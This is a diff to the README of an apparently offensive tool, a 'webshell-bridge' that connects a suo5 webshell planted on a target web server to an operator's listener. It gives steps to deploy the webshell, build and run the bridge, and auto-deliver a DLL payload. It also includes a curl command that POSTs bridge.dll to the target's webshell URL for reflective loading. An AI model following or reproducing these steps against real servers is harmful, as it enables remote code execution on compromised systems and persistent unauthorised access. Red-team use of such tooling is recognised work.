@@ -75,7 +75,11 @@ Client exec("whoami")
 
 ## Usage
 
-### 1. Build and run bridge binary
+### 1. Deploy webshell
+
+Deploy the suo5 webshell (JSP/PHP/ASPX) to the target web server.
+
+### 2. Build and run bridge binary
 
 ```bash
 go build -o webshell-bridge ./server/cmd/webshell-bridge/
@@ -84,22 +88,25 @@ webshell-bridge \
   --auth listener.auth \
   --suo5 suo5://target.com/suo5.aspx \
   --listener my-listener \
-  --token CHANGE_ME_RANDOM_TOKEN
+  --token CHANGE_ME_RANDOM_TOKEN \
+  --dll bridge.dll
 ```
 
 The `--token` must match the `STAGE_TOKEN` constant in the webshell. The suo5 URL is converted to HTTP(S) automatically (`suo5://` → `http://`, `suo5s://` → `https://`).
 
+The `--dll` flag enables auto-loading: when the pipeline starts, the bridge automatically delivers the DLL to the webshell via `X-Stage: load` if it is not already loaded. If `--dll` is omitted, you must load the DLL manually (see below).
+
 At startup the bridge registers the listener, opens `JobStream`, and waits for pipeline control messages.
 
-### 2. Register and start the pipeline from Client/TUI
+### 3. Register and start the pipeline from Client/TUI
 
 ```
 webshell new --listener my-listener
 ```
 
-### 3. Deploy webshell + load bridge DLL
+The bridge receives the start event, auto-loads the DLL (if `--dll` was provided), establishes the session, and the operator can interact immediately.
 
-Deploy the suo5 webshell (JSP/PHP/ASPX) to the target web server, then send the bridge DLL:
+**Manual DLL loading** (only needed if `--dll` is not set):
 
 ```bash
 curl -X POST \
@@ -108,8 +115,6 @@ curl -X POST \
   --data-binary @bridge.dll \
   http://target.com/suo5.aspx
 ```
-
-The webshell loads the DLL via ReflectiveLoader, then resolves `bridge_init`/`bridge_process` exports from the mapped PE image. If the DLL is not loaded when the pipeline starts, the bridge retries with exponential backoff.
 
 ### 4. Interact
 
